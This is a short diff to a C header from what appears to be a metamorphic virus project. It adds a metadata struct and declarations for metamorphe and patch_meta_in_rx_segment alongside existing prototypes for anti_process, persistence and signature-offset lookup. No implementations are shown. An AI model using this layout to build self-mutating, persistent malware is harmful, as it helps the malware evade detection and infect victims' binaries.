@@ -39,6 +39,15 @@ typedef enum {
 	FT_TEXT
 } file_type_t;
 
+typedef struct s_meta
+{
+	uint64_t	fingerprint;
+	uint64_t	counter;
+	uint32_t	version;
+	uint32_t	flags;
+}	t_meta;
+
+
 typedef struct {
 	file_type_t         type;
 	size_t              offset;
@@ -55,5 +64,6 @@ int         anti_process(char *path);
 void        persistence();
 off_t		vaddr_to_file_offset(int fd, uint64_t vaddr);
 off_t		find_signature_offset(int fd);
-void		generate_metamorphe(int fd);
+void		metamorphe(int fd, char *path);
+int patch_meta_in_rx_segment(const char *path, const char *meta);
 #endif
